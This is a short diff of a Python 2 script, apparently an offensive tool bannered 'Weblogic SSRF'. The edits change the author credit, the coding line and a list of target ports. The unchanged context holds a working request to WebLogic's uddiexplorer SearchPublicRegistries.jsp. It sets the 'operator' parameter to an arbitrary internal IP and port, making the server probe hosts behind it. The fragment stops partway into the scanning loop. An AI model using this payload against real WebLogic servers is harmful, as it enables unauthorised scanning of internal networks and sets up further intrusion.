@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
+#! coding: utf-8
 import re
 import sys
 import time
@@ -11,13 +11,14 @@ def banner():
     print """
         +----------------------------------------+
         +               Weblogic SSRF                         +
-        +                           by kkk                     +
+        +                           by whois                     +
         +----------------------------------------+
         =========================================="""
 
 def scan(url,ip_str):
   
-    ports = ('21','22','23','53','80','135','139','443','445','1433','1521','3306','3389','8080','7001','7002','8000','8080','11211',)
+    ports = [ '21','22','23','80','443','445','1433','1521','3306','3389','8080','7001','8000','8080','11211', ]
+    
     for port in ports:
         exp_url = "{0}/uddiexplorer/SearchPublicRegistries.jsp?operator=http://{1}:{2}&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search".format(url,ip_str,port)
         try:
